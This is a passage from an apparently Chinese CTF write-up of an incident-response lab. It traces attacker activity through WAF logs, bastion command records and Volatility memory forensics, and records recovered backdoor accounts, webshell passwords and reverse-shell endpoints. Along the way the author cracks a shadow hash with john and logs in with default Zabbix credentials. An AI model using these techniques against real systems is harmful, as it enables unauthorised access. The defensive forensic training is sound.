+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> pyinstxtractor.<span class="keyword">py</span> home</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116190910625.png" alt="image-20250116190910625"></p>
+<p>再把pyc拿去反编译，我用的是pycdc</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116191137093.png" alt="image-20250116191137093"></p>
+<p>密码1qaz@WSX3edc</p>
+<p>地址82.157.238.111</p>
+<h2 id="7-提交存在反序列化漏洞的端口"><a href="#7-提交存在反序列化漏洞的端口" class="headerlink" title="7.提交存在反序列化漏洞的端口"></a>7.提交存在反序列化漏洞的端口</h2><p>格式为:[md5(端口)]</p>
+<p>我们这时候打开waf看看是长亭的雷池，攻击事件，原始日志，反序列化</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116191615391.png" alt="image-20250116191615391"></p>
+<p>看下详情</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116192633011.png" alt="image-20250116192633011"></p>
+<p>8080</p>
+<h2 id="8-提交攻击者使用的后门路由地址"><a href="#8-提交攻击者使用的后门路由地址" class="headerlink" title="8.提交攻击者使用的后门路由地址"></a>8.提交攻击者使用的后门路由地址</h2><p>格式为:[md5(&#x2F;api&#x2F;xxx)]</p>
+<p>切回到堡垒机找命令记录一点一点翻找</p>
+<p>找到了cat app.py</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116193449486.png" alt="image-20250116193449486"></p>
+<p>前面下载flask，各种docker命令我也不知道具体在干啥，貌似是先上传flask，然后利用flask执行命令再把执行的命令和时间戳写入到log里</p>
+<p>&#x2F;api&#x2F;system</p>
+<h2 id="9-提交dnslog反弹域名"><a href="#9-提交dnslog反弹域名" class="headerlink" title="9.提交dnslog反弹域名"></a>9.提交dnslog反弹域名</h2><p>格式为:[md5(域名)]</p>
+<p>上面知道了攻击者把命令写入到日志了，我们继续从webserver的磁盘里找flask的log</p>
+<p>得到域名</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116194829327.png" alt="image-20250116194829327"></p>
+<h2 id="10-提交第一次扫描器使用时间"><a href="#10-提交第一次扫描器使用时间" class="headerlink" title="10.提交第一次扫描器使用时间"></a>10.提交第一次扫描器使用时间</h2><p>格式为:[2024&#x2F;00&#x2F;00&#x2F;00:00:00]</p>
+<p>接着查看log发现时间戳间隔很小很小</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116200410171.png" alt="image-20250116200410171"></p>
+<p>1713119219</p>
+<p>2024-04-15 02:26:59</p>
+<h2 id="11-提交攻击者反弹shell使用的语言"><a href="#11-提交攻击者反弹shell使用的语言" class="headerlink" title="11.提交攻击者反弹shell使用的语言"></a>11.提交攻击者反弹shell使用的语言</h2><p>格式为:[md5(c++&amp;java)]均为小写</p>
+<p>继续找log，可以看到import，那就是python</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116200621375.png" alt="image-20250116200621375"></p>
+<h2 id="12-提交攻击者反弹shell的ip"><a href="#12-提交攻击者反弹shell的ip" class="headerlink" title="12.提交攻击者反弹shell的ip"></a>12.提交攻击者反弹shell的ip</h2><p>格式为:[xxx.xxx.xxx.xxx]</p>
+<p>IP也在上面呢[82.157.238.174]</p>
+<h2 id="13-提交攻击者留下的账号"><a href="#13-提交攻击者留下的账号" class="headerlink" title="13.提交攻击者留下的账号"></a>13.提交攻击者留下的账号</h2><p>格式为:[xxxxx]</p>
+<p>找账号的话。去webserver的etc下的passwd看看</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116200835480.png" alt="image-20250116200835480"></p>
+<p>有个叫palu.com的账户</p>
+<p>就是他了</p>
+<h2 id="14-提交攻击者的后门账户密码"><a href="#14-提交攻击者的后门账户密码" class="headerlink" title="14.提交攻击者的后门账户密码"></a>14.提交攻击者的后门账户密码</h2><p>格式为:[md5(password)]</p>
+<p>密码存放在shadow里面</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116200946352.png" alt="image-20250116200946352"></p>
+<p>但是被加密了，用john破解shadow</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116201529344.png" alt="image-20250116201529344"></p>
+<p>密码123123</p>
+<h2 id="15-提交测试数据条数"><a href="#15-提交测试数据条数" class="headerlink" title="15.提交测试数据条数"></a>15.提交测试数据条数</h2><p>格式为[md5(xxx)]</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116202458192.png" alt="image-20250116202458192"></p>
+<p>这个不会，看wp原来是让找数据库的,这里有五个用户，即五条数据</p>
+<h2 id="16-请提交攻击者留下的信息"><a href="#16-请提交攻击者留下的信息" class="headerlink" title="16.请提交攻击者留下的信息"></a>16.请提交攻击者留下的信息</h2><p>格式为:[xxxx]</p>
+<p>查找&#x2F;var&#x2F;log&#x2F;nginx下发现了hacktext</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116203038476.png" alt="image-20250116203038476"></p>
+<h2 id="17-请提交运维服务器上的恶意文件md5小写32"><a href="#17-请提交运维服务器上的恶意文件md5小写32" class="headerlink" title="17.请提交运维服务器上的恶意文件md5小写32"></a>17.请提交运维服务器上的恶意文件md5小写32</h2><p>格式为:[xxxx]</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116203318938.png" alt="image-20250116203318938"></p>
+<p>查看堡垒机文件传输日志，发现了个很可疑的文件</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116203638844.png" alt="image-20250116203638844"></p>
+<h2 id="18-提交恶意文件的恶意函数"><a href="#18-提交恶意文件的恶意函数" class="headerlink" title="18.提交恶意文件的恶意函数"></a>18.提交恶意文件的恶意函数</h2><p>格式为:[md5(恶意函数)]</p>
+<p>一样拿ssh连接把helloworld文件弄下来，开放的端口依然是222（拿nmap扫出来的）</p>
+<p>然后拿ida反编译看看</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116205327260.png" alt="image-20250116205327260"></p>
+<p>恶意函数名begingame</p>
+<h2 id="19-请提交攻击者恶意注册的恶意用户条数"><a href="#19-请提交攻击者恶意注册的恶意用户条数" class="headerlink" title="19.请提交攻击者恶意注册的恶意用户条数"></a>19.请提交攻击者恶意注册的恶意用户条数</h2><p>格式为:[md5(x)]</p>
+<p>web服务是dz论坛192.168.20.121 </p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116205908026.png" alt="image-20250116205908026"></p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116210038030.png" alt="image-20250116210038030"></p>
+<p>kongzi有10个，应该就是10条了</p>
+<h2 id="20-请提交对博客系统的第一次扫描时间"><a href="#20-请提交对博客系统的第一次扫描时间" class="headerlink" title="20.请提交对博客系统的第一次扫描时间"></a>20.请提交对博客系统的第一次扫描时间</h2><p>格式为:[[2024&#x2F;00&#x2F;00&#x2F;00:00:00]</p>
+<p>先看防护站点123也部署的有dz，我们去WAF找一下</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116210752269.png" alt="image-20250116210752269"></p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116210836091.png" alt="image-20250116210836091"></p>
+<p>扫了3600多次</p>
+<p> 2024-04-16 21:03:46</p>
+<h2 id="21-提交攻击者下载的文件"><a href="#21-提交攻击者下载的文件" class="headerlink" title="21.提交攻击者下载的文件"></a>21.提交攻击者下载的文件</h2><p>格式为[xxxx.xxx]</p>
+<p>WP说是WAF里站点资源的<img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116211155154.png" alt="image-20250116211155154"></p>
+<p>192.168.20.123&#x2F;upload.zip确实可以把源码下下来，源码泄露</p>
+<h2 id="22-请提交攻击者第一次下载的时间"><a href="#22-请提交攻击者第一次下载的时间" class="headerlink" title="22.请提交攻击者第一次下载的时间"></a>22.请提交攻击者第一次下载的时间</h2><p>格式为:[xx&#x2F;Apr&#x2F;2024:xx:xx:xx]</p>
+<p>找到webserver的&#x2F;var&#x2F;log&#x2F;apache2压缩包里的日志</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116213818393.png" alt="image-20250116213818393"></p>
+<p>搜索upload</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116214935832.png" alt="image-20250116214935832"></p>
+<p>[16&#x2F;Apr&#x2F;2024:09:03:52 -0400]</p>
+<h2 id="23-请提交攻击者留下的冰蝎马的文件名称"><a href="#23-请提交攻击者留下的冰蝎马的文件名称" class="headerlink" title="23.请提交攻击者留下的冰蝎马的文件名称"></a>23.请提交攻击者留下的冰蝎马的文件名称</h2><p>格式为:[xxxx]</p>
+<p>直接把整个网站拉下来放到d盾检测一下</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116220436489.png" alt="image-20250116220436489"></p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116220450550.png" alt="image-20250116220450550"></p>
+<p>nidewen.php</p>
+<h2 id="24-提交冰蝎的链接密码"><a href="#24-提交冰蝎的链接密码" class="headerlink" title="24.提交冰蝎的链接密码"></a>24.提交冰蝎的链接密码</h2><p>格式为:[xxx]</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116220535800.png" alt="image-20250116220535800"></p>
+<p>1be873048db838ac MD5解密</p>
+<p>nidewen</p>
+<h2 id="25-提交办公区存在的恶意用户名"><a href="#25-提交办公区存在的恶意用户名" class="headerlink" title="25.提交办公区存在的恶意用户名"></a>25.提交办公区存在的恶意用户名</h2><p>格式为:[xxx]</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116221341852.png" alt="image-20250116221341852"></p>
+<p>PC1的hacker账户</p>
+<h2 id="26-提交恶意用户密码到期时间"><a href="#26-提交恶意用户密码到期时间" class="headerlink" title="26.提交恶意用户密码到期时间"></a>26.提交恶意用户密码到期时间</h2><p>格式为:[xxxx]</p>
+<p>进入PC1，win+r输入cmd</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">net <span class="keyword">user</span> <span class="title">hacker</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116221612242.png" alt="image-20250116221612242"></p>
+<p>[2024&#x2F;5&#x2F;28&#x2F;21:40:37]</p>
+<h2 id="27-请对办公区留存的镜像取证并指出内存疑似恶意进程"><a href="#27-请对办公区留存的镜像取证并指出内存疑似恶意进程" class="headerlink" title="27.请对办公区留存的镜像取证并指出内存疑似恶意进程"></a>27.请对办公区留存的镜像取证并指出内存疑似恶意进程</h2><p>格式为:[xxxx]</p>
+<p>桌面上有个raw.raw拖出来看看，看wp需要用volatility3</p>
+<p>先在kali上安装一下</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/volatilityfoundation/volatility3.git</span><br></pre></td></tr></table></figure>
+
+<p>然后打开文件夹执行命令,查看进程</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 vol<span class="selector-class">.py</span> -f raw<span class="selector-class">.raw</span> windows.pslist</span><br></pre></td></tr></table></figure>
+
+<p>这里再给几个其他常见命令</p>
+<p>查看进程树</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 vol<span class="selector-class">.py</span> -f raw<span class="selector-class">.rwa</span> windows.pstree</span><br></pre></td></tr></table></figure>
+
+<p>查看系统命令行参数</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 vol<span class="selector-class">.py</span> -f raw<span class="selector-class">.rwa</span> windows.cmdline</span><br></pre></td></tr></table></figure>
+
+<p>查找系统中存在的文件（grep查询）</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python3</span> vol.<span class="keyword">py</span> -<span class="keyword">f</span> raw.raw windows.filescan |<span class="keyword">grep</span> lass.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure>
+
+<p>查看注册表</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 vol<span class="selector-class">.py</span> -f raw<span class="selector-class">.raw</span> windows<span class="selector-class">.registry</span>.hivelist</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250116225623582.png" alt="image-20250116225623582">.hack.ex</p>
+<h2 id="28-请指出该员工使用的公司OA平台的密码"><a href="#28-请指出该员工使用的公司OA平台的密码" class="headerlink" title="28.请指出该员工使用的公司OA平台的密码"></a>28.请指出该员工使用的公司OA平台的密码</h2><p>格式为:[xxxx]</p>
+<p>还是要用volatility3</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python3</span> vol.<span class="keyword">py</span> -<span class="keyword">f</span> raw.raw filescan | <span class="keyword">grep</span> <span class="string">&quot;pass&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117102958624.png" alt="image-20250117102958624"></p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 vol<span class="selector-class">.py</span> -f raw<span class="selector-class">.raw</span> windows<span class="selector-class">.dumpfiles</span> <span class="attr">--physaddr</span>=<span class="string">&quot;0x3e296f20&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>提取这个文件，得到OA网站和用户名密码</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117105033916.png" alt="image-20250117105033916"></p>
+<p>liuling7541</p>
+<h2 id="29-攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么"><a href="#29-攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么" class="headerlink" title="29.攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么"></a>29.攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么</h2><p>格式为:[xxxx]</p>
+<p>权限维持,看大佬们的wp是从剪切板和注册表找到了，我用vol3实在是没找到，只能用vol2.6了</p>
+<p>查看剪切板</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f raw<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117121322473.png" alt="image-20250117121322473"></p>
+<p>找到h4ck3d！</p>
+<h2 id="30-请提交该计算机中记录的重要联系人的家庭住址"><a href="#30-请提交该计算机中记录的重要联系人的家庭住址" class="headerlink" title="30.请提交该计算机中记录的重要联系人的家庭住址"></a>30.请提交该计算机中记录的重要联系人的家庭住址</h2><p>格式为:[xxxxx]</p>
+<p>Windows联系人文件为.contact后缀</p>
+<p>查找文件</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python3</span> vol.<span class="keyword">py</span> -<span class="keyword">f</span> raw.raw windows.filescan |<span class="keyword">grep</span> contact</span><br></pre></td></tr></table></figure>
+
+<p>找到王总了，导出</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117125947101.png" alt="image-20250117125947101"></p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 vol<span class="selector-class">.py</span> -f raw<span class="selector-class">.raw</span> windows<span class="selector-class">.dumpfiles</span> <span class="attr">--physaddr</span>=<span class="string">&quot;0x3de90340&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>记事本打开</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117130339632.png" alt="image-20250117130339632"></p>
+<p>秋水省雁荡市碧波区千屿山庄1号</p>
+<h2 id="31-请提交近源靶机上的恶意文件哈希"><a href="#31-请提交近源靶机上的恶意文件哈希" class="headerlink" title="31.请提交近源靶机上的恶意文件哈希"></a>31.请提交近源靶机上的恶意文件哈希</h2><p>格式为:[xxx]</p>
+<p>打开PC2</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117132856167.png" alt="image-20250117132856167"></p>
+<p>win+r输入shell:startup，但是我这上面都没有</p>
+<p>快速访问这里有<img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117133030389.png" alt="image-20250117133030389"></p>
+<p>堡垒机这里也可以看到<img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117133137550.png" alt="image-20250117133137550"></p>
+<p>但是不知道为什么我的PC2没有那个程序（很久之前就下载了帕鲁杯的文件之前打开过一次，现在才来做，不知道是不是之前弄坏了）</p>
+<h2 id="32-提交恶意程序的外联地址"><a href="#32-提交恶意程序的外联地址" class="headerlink" title="32.提交恶意程序的外联地址"></a>32.提交恶意程序的外联地址</h2><p>格式为:[xxxxx]</p>
+<p>没有上面那个程序我这题也没法做，正常来说拿到恶意程序丢到沙县就能找到了</p>
+<p>这里附上mumuzi师傅的图</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117133342724.png" alt="image-20250117133342724"></p>
+<h2 id="33-提交攻击者使用内网扫描工具的哈希"><a href="#33-提交攻击者使用内网扫描工具的哈希" class="headerlink" title="33.提交攻击者使用内网扫描工具的哈希"></a>33.提交攻击者使用内网扫描工具的哈希</h2><p>格式为:[xxxx]</p>
+<p>堡垒机这里的命令记录可以找到</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117133918494.png" alt="image-20250117133918494"></p>
+<p>常见的内网扫描工具fscan</p>
+<h2 id="34-请提交攻击者在站点上留下的后门密码"><a href="#34-请提交攻击者在站点上留下的后门密码" class="headerlink" title="34.请提交攻击者在站点上留下的后门密码"></a>34.请提交攻击者在站点上留下的后门密码</h2><p>格式为:[xxxx]</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117134111985.png" alt="image-20250117134111985"></p>
+<p>waf这里可以看到都是123</p>
+<p>密码就是123</p>
+<h2 id="35-请提交攻击者在数据库留下的信息"><a href="#35-请提交攻击者在数据库留下的信息" class="headerlink" title="35.请提交攻击者在数据库留下的信息"></a>35.请提交攻击者在数据库留下的信息</h2><p>格式为:[xxxx]</p>
+<p>连接数据库，留下的信息肯定是从web服务留下的，也就是dz论坛</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117134452945.png" alt="image-20250117134452945"></p>
+<h2 id="36-提交攻击者在监控服务器上留下的dcnlog地址"><a href="#36-提交攻击者在监控服务器上留下的dcnlog地址" class="headerlink" title="36.提交攻击者在监控服务器上留下的dcnlog地址"></a>36.提交攻击者在监控服务器上留下的dcnlog地址</h2><p>格式为:[xxx.xx.xx]</p>
+<p>监控服务器是Zabbix对应的就是我们的mysql2数据库，连接mysql2</p>
+<p>在数据库发现用户名是默认的用户名Admin，试试是不是默认密码zabbix</p>
+<p>成功登录上去，找到脚本得到dcnlog域名</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117135243639.png" alt="image-20250117135243639"></p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117135316259.png" alt="image-20250117135316259"></p>
+<p>palu.dcnlog.cn</p>
+<h2 id="37-提交监控服务器上恶意用户的上一次登录时间"><a href="#37-提交监控服务器上恶意用户的上一次登录时间" class="headerlink" title="37.提交监控服务器上恶意用户的上一次登录时间"></a>37.提交监控服务器上恶意用户的上一次登录时间</h2><p>格式为:[xx&#x2F;xx&#x2F;xx&#x2F;xx:xx:xx]</p>
+<p>用户这里得到最后一次登录时间</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117134748511.png" alt="image-20250117134748511"></p>
+<p>(2024-04-17 01:32:44)</p>
+<h2 id="38-提交监控服务器上遗留的反弹shell地址和端口"><a href="#38-提交监控服务器上遗留的反弹shell地址和端口" class="headerlink" title="38.提交监控服务器上遗留的反弹shell地址和端口"></a>38.提交监控服务器上遗留的反弹shell地址和端口</h2><p>格式为:[xxxx:xx]</p>
+<p>上面那张图第一个脚本base64解码</p>
+<p>得到<img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117135522211.png" alt="image-20250117135522211"></p>
+<p>154.183.110.12:7890</p>
+<h2 id="39-提交恶意钓鱼文件的哈希"><a href="#39-提交恶意钓鱼文件的哈希" class="headerlink" title="39.提交恶意钓鱼文件的哈希"></a>39.提交恶意钓鱼文件的哈希</h2><p>格式为:[xxxx]</p>
+<p>之前在PC2是看到了一个文件<img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117135754941.png" alt="image-20250117135754941"></p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117140139838.png" alt="image-20250117140139838"></p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">certutil</span> -hashfile 文件</span><br></pre></td></tr></table></figure>
+
+<p>[da75025ff7f3b6baa27f5913c1c83063]</p>
+<h2 id="40-提交恶意文件外联IP"><a href="#40-提交恶意文件外联IP" class="headerlink" title="40.提交恶意文件外联IP"></a>40.提交恶意文件外联IP</h2><p>格式为:[xxx]</p>
+<p>what，找遍wp也没找到这道题</p>
+<h2 id="41-提交被恶意文件钓鱼使用者的姓名"><a href="#41-提交被恶意文件钓鱼使用者的姓名" class="headerlink" title="41.提交被恶意文件钓鱼使用者的姓名"></a>41.提交被恶意文件钓鱼使用者的姓名</h2><p>格式为:[xxx]</p>
+<p>PC2这里有很多用户找一下</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117140313632.png" alt="image-20250117140313632"></p>
+<p>也可以在PC02直接搜索文件然后找到</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117143403197.png" alt="image-20250117143403197"></p>
+<p>陈琚鹭</p>
+<h2 id="42-提交攻击者留下的信息"><a href="#42-提交攻击者留下的信息" class="headerlink" title="42.提交攻击者留下的信息"></a>42.提交攻击者留下的信息</h2><p>格式为:[xxxx]</p>
+<p>在堡垒机可以看到关于对PC02注册表的操作</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117143449179.png" alt="image-20250117143449179"></p>
+<p>打开注册表就直接找到了</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117143524735.png" alt="image-20250117143524735"></p>
+<p>flag{2024-04-17-hi}</p>
+<h2 id="43-提交恶意用户数量"><a href="#43-提交恶意用户数量" class="headerlink" title="43.提交恶意用户数量"></a>43.提交恶意用户数量</h2><p>格式为:[md5(xxxx)]<br>请提交员工集体使用的密码<br>格式为:[xxxx]</p>
+<p>打开cmd执行</p>
+<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">net <span class="keyword">user</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117143719767.png" alt="image-20250117143719767"></p>
+<p>有49个数字递增的用户20+20+9</p>
+<h2 id="44-请提交员工集体使用的密码"><a href="#44-请提交员工集体使用的密码" class="headerlink" title="44.请提交员工集体使用的密码"></a>44.请提交员工集体使用的密码</h2><p>格式为:[xxxx]</p>
+<p>在PC02发现有个脚本</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117143925354.png" alt="image-20250117143925354"></p>
+<p>把这些用户的密码修改了</p>
+<p>在堡垒机找到这个111</p>
+<p>会话: cc9e78c0-80cb-4c55-97e8-00263f84fa60</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117144413725.png" alt="image-20250117144413725"></p>
+<p>转到，查看回放可以看到密码</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117144453136.png" alt="image-20250117144453136"></p>
+<p>Network@2020</p>
+<h2 id="45-提交加密文件的哈希"><a href="#45-提交加密文件的哈希" class="headerlink" title="45.提交加密文件的哈希"></a>45.提交加密文件的哈希</h2><p>格式为:[xxxx]</p>
+<p>加密文件就是PC02的最近访问的encode.txt打开其实是玛卡巴卡加密</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117144551310.png" alt="image-20250117144551310"></p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">certutil</span> -hashfile encode.txt</span><br></pre></td></tr></table></figure>
+
+<p>计算md5</p>
+<p><img src="/2025/01/17/%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/image-20250117145012402.png" alt="image-20250117145012402"></p>
+<p>b8dea667e2b7db829792356cd568cfb8dcbf9925</p>
+<h2 id="46-提交被攻击者加密的内容明文"><a href="#46-提交被攻击者加密的内容明文" class="headerlink" title="46.提交被攻击者加密的内容明文"></a>46.提交被攻击者加密的内容明文</h2><p>格式为:[xxxx]</p>
+<p>玛卡巴卡加密</p>
